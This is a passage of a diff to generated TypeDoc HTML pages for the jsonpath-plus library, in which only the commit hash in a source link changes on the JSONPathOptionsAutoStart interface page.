class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>result<wbr/>Type</span></a><a href=\"#sandbox\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>sandbox</span></a><a href=\"#wrap\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>wrap</span></a></div></details></div></details></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n+</div></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L79\">jsonpath.d.ts:79</a></li></ul></aside></section></section></details></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div><details open class=\"tsd-accordion tsd-page-navigation\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>On This Page</h3></summary><div class=\"tsd-accordion-details\"><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Properties\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Properties</summary><div><a href=\"#autostart\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>autostart</span></a><a href=\"#callback\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>callback</span></a><a href=\"#eval\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>eval</span></a><a href=\"#flatten\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>flatten</span></a><a href=\"#ignoreEvalErrors\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>ignore<wbr/>Eval<wbr/>Errors</span></a><a href=\"#json\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>json</span></a><a href=\"#otherTypeCallback\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>other<wbr/>Type<wbr/>Callback</span></a><a href=\"#parent\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>parent</span></a><a href=\"#parentProperty\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>parent<wbr/>Property</span></a><a href=\"#path\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>path</span></a><a href=\"#resultType\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>result<wbr/>Type</span></a><a href=\"#sandbox\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>sandbox</span></a><a href=\"#wrap\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>wrap</span></a></div></details></div></details></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n```\n\nFilename: docs/ts/interfaces/JSONPathOptionsAutoStart.html:\n```\n@@ -1,4 +1,4 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathOptionsAutoStart | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathOptionsAutoStart.html\">JSONPathOptionsAutoStart</a></li></ul><h1>Interface JSONPathOptionsAutoStart</h1></div><div class=\"tsd-signature\"><span class=\"tsd-signature-keyword\">interface </span><span class=\"tsd-kind-interface\">JSONPathOptionsAutoStart</span> <span class=\"tsd-signature-symbol\">{ </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#autostart\">autostart</a><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">false</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#callback\">callback</a><span class=\"tsd-signature-symbol\">?: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#eval\">eval</a><span class=\"tsd-signature-symbol\">?: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-keyword\">typeof </span><a href=\"../classes/EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;safe&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;native&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">code</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span>, <span class=\"tsd-kind-parameter\">context</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">object</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#flatten\">flatten</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#ignoreEvalErrors\">ignoreEvalErrors</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#json\">json</a><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#otherTypeCallback\">otherTypeCallback</a><span class=\"tsd-signature-symbol\">?: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#parent\">parent</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#parentProperty\">parentProperty</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#path\">path</a><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#resultType\">resultType</a><span class=\"tsd-signature-symbol\">?: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;value&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;path&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;pointer&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parent&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parentProperty&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;all&quot;</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#sandbox\">sandbox</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">Map</span><span class=\"tsd-signature-symbol\">&lt;</span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">, </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#wrap\">wrap</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span class=\"tsd-signature-symbol\">}</span></div><section class=\"tsd-panel tsd-hierarchy\"><h4>Hierarchy (<a href=\"../hierarchy.html#JSONPathOptionsAutoStart\">view full</a>)</h4><ul class=\"tsd-hierarchy\"><li><a href=\"JSONPathOptions.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptions</a><ul class=\"tsd-hierarchy\"><li><span class=\"target\">JSONPathOptionsAutoStart</span></li></ul></li></ul></section><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L158\">jsonpath.d.ts:158</a></li></ul></aside><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><details class=\"tsd-index-content tsd-accordion\" open><summary class=\"tsd-accordion-summary tsd-index-summary\"><h5 class=\"tsd-index-heading uppercase\" role=\"button\" aria-expanded=\"false\" tabIndex=\"0\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronSmall\"></use></svg> Index</h5></summary><div class=\"tsd-accordion-details\"><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Properties</h3><div class=\"tsd-index-list\"><a href=\"JSONPathOptionsAutoStart.html#autostart\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>autostart</span></a>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathOptionsAutoStart | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathOptionsAutoStart.html\">JSONPathOptionsAutoStart</a></li></ul><h1>Interface JSONPathOptionsAutoStart</h1></div><div class=\"tsd-signature\"><span class=\"tsd-signature-keyword\">interface </span><span class=\"tsd-kind-interface\">JSONPathOptionsAutoStart</span> <span class=\"tsd-signature-symbol\">{ </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#autostart\">autostart</a><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">false</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#callback\">callback</a><span class=\"tsd-signature-symbol\">?: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#eval\">eval</a><span class=\"tsd-signature-symbol\">?: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-keyword\">typeof </span><a href=\"../classes/EvalClass.html\" class=\"tsd-signature-type tsd-kind-class\">EvalClass</a><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;safe&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;native&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">code</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span>, <span class=\"tsd-kind-parameter\">context</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">object</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#flatten\">flatten</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#ignoreEvalErrors\">ignoreEvalErrors</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#json\">json</a><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#otherTypeCallback\">otherTypeCallback</a><span class=\"tsd-signature-symbol\">?: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#parent\">parent</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#parentProperty\">parentProperty</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#path\">path</a><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#resultType\">resultType</a><span class=\"tsd-signature-symbol\">?: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;value&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;path&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;pointer&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parent&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parentProperty&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;all&quot;</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#sandbox\">sandbox</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">Map</span><span class=\"tsd-signature-symbol\">&lt;</span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">, </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><a class=\"tsd-kind-property\" href=\"JSONPathOptionsAutoStart.html#wrap\">wrap</a><span class=\"tsd-signature-symbol\">?: </span><span class=\"tsd-signature-type\">boolean</span><span class=\"tsd-signature-symbol\">; </span><br/><span class=\"tsd-signature-symbol\">}</span></div><section class=\"tsd-panel tsd-hierarchy\"><h4>Hierarchy (<a href=\"../hierarchy.html#JSONPathOptionsAutoStart\">view full</a>)</h4><ul class=\"tsd-hierarchy\"><li><a href=\"JSONPathOptions.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptions</a><ul class=\"tsd-hierarchy\"><li><span class=\"target\">JSONPathOptionsAutoStart</span></li></ul></li></ul></section><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L158\">jsonpath.d.ts:158</a></li></ul></aside><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><details class=\"tsd-index-content tsd-accordion\" open><summary class=\"tsd-accordion-summary tsd-index-summary\"><h5 class=\"tsd-index-heading uppercase\" role=\"button\" aria-expanded=\"false\" tabIndex=\"0\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronSmall\"></use></svg> Index</h5></summary><div class=\"tsd-accordion-details\"><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Properties</h3><div class=\"tsd-index-list\"><a href=\"JSONPathOptionsAutoStart.html#autostart\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>autostart</span></a>\n <a href=\"JSONPathOptionsAutoStart.html#callback\" class=\"tsd-index-link tsd-is-inherited\"><svg 